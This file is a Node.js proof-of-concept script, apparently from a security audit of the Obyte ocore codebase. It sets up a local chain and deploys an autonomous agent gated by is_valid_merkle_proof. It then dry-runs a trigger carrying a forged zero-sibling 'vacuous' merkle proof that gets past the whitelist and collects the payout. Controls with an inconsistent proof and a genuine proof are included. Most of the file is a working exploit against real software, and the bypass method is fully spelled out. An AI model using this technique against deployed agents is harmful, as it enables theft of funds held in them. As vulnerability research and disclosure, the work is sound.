// E1-3 — F1 vulnerable-AA demonstration: whitelist-gated AA bypass via the vacuous merkle proof
// Real path: synthetic genesis (real validation+save) + aa_composer.dryRunPrimaryAATrigger
// (the exact entry the wallet/test suite uses to evaluate an AA trigger and compose its response).
// No mocks; only the key/signer glue mirrors the wallet signer interface (r1-lab convention).
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const DATA = path.join(__dirname, ".e13data");
fs.rmSync(DATA, { recursive: true, force: true });
fs.mkdirSync(DATA, { recursive: true });

const crypto = require("crypto");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");

const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return DATA; };

function makeKey() {
	let priv;
	do { priv = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(priv));
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
const signHash = (hashBuf, privHex) => Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const objectHash0 = require(O_CORE + "/object_hash.js");
const keys = { attacker: makeKey(), witness: makeKey() };
const defOf = (k) => ["sig", { pubkey: k.pub }];
const addrOf = (k) => objectHash0.getChash160(defOf(k));
const attacker_addr = addrOf(keys.attacker);
const witness_addr = addrOf(keys.witness);

const TOTAL = 1e15;
function buildGenesis(objectHash, objectLength) {
	const g = {
		version: "4.0",
		alt: "1",
		timestamp: Math.round(Date.now() / 1000),
		authors: [{ address: witness_addr, definition: defOf(keys.witness), authentifiers: { r: "-" } }],
		messages: [],
		witnesses: [witness_addr],
		headers_commission: 0,
		payload_commission: 0,
	};
	const payload = {
		inputs: [{ type: "issue", amount: TOTAL, serial_number: 1 }],
		outputs: [
			{ address: attacker_addr, amount: 0 },
			{ address: witness_addr, amount: 0 },
		],
	};
	g.messages = [{ app: "payment", payload_location: "inline", payload, payload_hash: objectHash.getBase64Hash(payload, true) }];
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.headers_commission = objectLength.getHeadersSize(g);
	g.payload_commission = objectLength.getTotalPayloadSize(g);
	const spendable = TOTAL - g.headers_commission - g.payload_commission;
	payload.outputs[0].amount = Math.floor(spendable * 0.9);
	payload.outputs[1].amount = spendable - payload.outputs[0].amount;
	payload.outputs.sort((a, b) => (a.address < b.address ? -1 : 1));
	g.messages[0].payload_hash = objectHash.getBase64Hash(payload, true);
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.unit = objectHash.getUnitHash(g);
	return g;
}

const sha256b64 = (s) => crypto.createHash("sha256").update(s, "utf8").digest("base64");
const vacuousProof = (X) => "0-" + sha256b64(X);

async function main() {
	const constants = require(O_CORE + "/constants.js");
	const conf = require(O_CORE + "/conf.js");
	conf.bLight = true;

	const objectLength = require(O_CORE + "/object_length.js");
	const genesis = buildGenesis(objectHash0, objectLength);
	const genesisBall = objectHash0.getBallHash(genesis.unit);
	constants.GENESIS_UNIT = genesis.unit;
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const db = require(O_CORE + "/db.js");
	conf.bLight = false;
	await new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => { conn.query("SELECT 1", () => { conn.release(); resolve(); }); });
	});
	const rows = [
		["op_list", JSON.stringify([witness_addr]), -1],
		["threshold_size", "10000", -1],
		["base_tps_fee", "10", -1],
		["tps_interval", "60", -1],
		["tps_fee_multiplier", "10", -1],
	];
	for (const [subject, value, mci] of rows) {
		await new Promise((resolve, reject) => {
			db.takeConnectionFromPool((conn) => {
				conn.query("INSERT OR IGNORE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)", [subject, value, mci], () => { conn.release(); resolve(); });
			});
		});
	}
	conf.bLight = false;

	const storage = require(O_CORE + "/storage.js");
	const network = require(O_CORE + "/network.js");
	const validation = require(O_CORE + "/validation.js");
	const composer = require(O_CORE + "/composer.js");
	const writer = require(O_CORE + "/writer.js");

	["aa2UpgradeMci", "aa3UpgradeMci", "v4UpgradeMci", "pemCurvesFixMci", "noPrivateAssetsWithConditionsUpgradeMci",
		"timestampUpgradeMci", "includeKeySizesUpgradeMci", "lastBallStableInParentsUpgradeMci",
		"witnessedLevelMustNotRetreatUpgradeMci", "witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
		"branchedMinMcWlUpgradeMci", "altBranchByBestParentUpgradeMci", "spendUnconfirmedUpgradeMci",
		"bestParentPrefersOpUpgradeMci", "tpsFeeRecipientsFixMci", "unstableInitialDefinitionUpgradeMci",
	].forEach(k => { constants[k] = 0; });
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const query = (sql, params) => new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => { conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); }); });
	});
	for (let i = 0; i < 200 && typeof storage.getMinRetrievableMci() !== "number"; i++) await sleep(100);
	console.log("DB-READY min_retrievable_mci=", storage.getMinRetrievableMci());

	function validateAndSave(joint, label) {
		return new Promise((resolve, reject) => {
			validation.validate(joint, {
				ifOk: (objValidationState, unlock) => {
					console.log(label, "VALIDATION OK");
					objValidationState.count_primary_aa_triggers = objValidationState.count_primary_aa_triggers || 0;
					writer.saveJoint(joint, objValidationState, null, () => { unlock(); console.log(label, "SAVED"); resolve(); });
				},
				ifUnitError: (e) => { console.log(label, "UNIT-ERROR", e); reject(new Error(label + " unit error: " + e)); },
				ifJointError: (e) => { console.log(label, "JOINT-ERROR", e); reject(new Error(label + " joint error: " + e)); },
				ifTransientError: (e) => { console.log(label, "TRANSIENT", e); reject(new Error(label + " transient: " + e)); },
				ifNeedParentUnits: (arr) => reject(new Error(label + " need parents")),
				ifNeedHashTree: () => reject(new Error(label + " need hash tree")),
			});
		});
	}

	await validateAndSave({ unit: genesis, ball: genesisBall }, "GENESIS");
	const g = await query("SELECT unit, main_chain_index, is_stable, sequence, is_on_main_chain FROM units WHERE unit=?", [genesis.unit]);
	console.log("GENESIS-DB:", JSON.stringify(g[0]));

	// a NORMAL unit as the last stable MC unit (real composer path) — the AA machinery reads
	// objMcUnit.last_ball_unit / witnessed props that a bare genesis lacks
	function makeSigner(key) {
		return {
			readDefinition: (conn, address, cb) => cb(null, defOf(key)),
			readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
			readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
		};
	}
	const mcUnit = await new Promise((resolve, reject) => {
		composer.composeJoint({
			paying_addresses: [attacker_addr],
			signing_addresses: [attacker_addr],
			outputs: [{ address: attacker_addr, amount: 0 }],
			witnesses: [witness_addr],
			signer: makeSigner(keys.attacker),
			callbacks: {
				ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
				ifError: (e) => reject(new Error("mc compose error: " + JSON.stringify(e))),
				ifNotEnoughFunds: (e) => reject(new Error("mc not enough funds: " + e)),
			},
		});
	});
	await validateAndSave(mcUnit, "MC-UNIT");
	await new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query("UPDATE units SET is_stable=1, is_on_main_chain=1, main_chain_index=1 WHERE unit=?", [mcUnit.unit], () => { conn.release(); resolve(); });
		});
	});
	console.log("MC-UNIT-STABLE:", mcUnit.unit);

	// ---- the vulnerable AA ----
	const aa_composer = require(O_CORE + "/aa_composer.js");
	const aa_validation = require(O_CORE + "/aa_validation.js");
	const merkle = require(O_CORE + "/merkle.js");

	const aa = ["autonomous agent", {
		messages: [
			{ app: "payment", payload: { asset: "base", outputs: [
				{ address: "{trigger.initial_address}",
					amount: "{is_valid_merkle_proof(trigger.data.element, trigger.data.proof) ? trigger.output[[asset=base]] : 0}" }
			] } }
		]
	}];
	const aa_address = objectHash0.getChash160(aa);
	// the real test-suite pattern: register the AA in aa_addresses (FK for aa_balances) + addresses
	for (const a of [aa_address, attacker_addr, witness_addr]) {
		await query("INSERT OR IGNORE INTO addresses (address) VALUES(?)", [a]);
	}
	await new Promise((resolve, reject) => {
		storage.insertAADefinitions(db, [{ address: aa_address, definition: aa }], constants.GENESIS_UNIT, 1, 0, false, (e) => e ? reject(new Error("insertAA: " + e)) : resolve());
	});
	const readGetterProps = (conn, a, f, cb) => cb(null);
	await new Promise((resolve, reject) => {
		aa_validation.validateAADefinition(aa, readGetterProps, Number.MAX_SAFE_INTEGER, (e) => e ? reject(new Error("def invalid: " + e)) : resolve());
	});
	console.log("AA-DEF-VALID true", aa_address);

	const dryRun = util_promisify(aa_composer.dryRunPrimaryAATrigger);
	function util_promisify(fn) {
		return function (...args) {
			return new Promise((resolve, reject) => { fn(...args, resolve); });
		};
	}

	const payoutOf = (arrResponses) => {
		for (const r of arrResponses) {
			const unit = r.objResponseUnit || r.response_unit;
			if (!unit || !unit.messages) continue;
			for (const m of unit.messages) {
				if (m.app !== "payment" || !m.payload || !m.payload.outputs) continue;
				for (const o of m.payload.outputs) {
					if (o.amount && o.amount > 0) return { to: o.address, amount: o.amount, bounced: r.bounced };
				}
			}
		}
		return { bounced: arrResponses[0] && arrResponses[0].bounced, error: arrResponses[0] && arrResponses[0].response && arrResponses[0].response.error };
	};

	const results = {};
	const X = "attacker-arbitrary-element-42";
	const resAttack = await dryRun({ outputs: { base: 100000 }, data: { element: X, proof: vacuousProof(X) } }, aa_address, aa);
	results.attack_vacuous = { payout: payoutOf(resAttack), responses: resAttack.length };

	const resBad = await dryRun({ outputs: { base: 100000 }, data: { element: X, proof: "0-" + sha256b64("some-other-element") } }, aa_address, aa);
	results.negative_inconsistent_proof = { payout: payoutOf(resBad) };

	const tree = ["alice", "bob", "carol", "dave", "eve"];
	const realSerialized = merkle.serializeMerkleProof(merkle.getMerkleProof(tree, 2));
	const resReal = await dryRun({ outputs: { base: 100000 }, data: { element: "carol", proof: realSerialized } }, aa_address, aa);
	results.positive_real_member = { payout: payoutOf(resReal) };

	results.e01ba3e_cap = {
		capNote: "cap requires siblings.length > 50 OR non-string siblings (evaluation.js:1787-1791, mci-gated) — vacuous proof has 0 siblings",
		vacuousProofSiblings: 0,
		mitigated: false,
	};

	console.log("E13-RESULTS " + JSON.stringify(results, null, 1));
	process.exit(0);
}

main().catch((e) => { console.error("E13-FATAL", e); process.exit(1); });
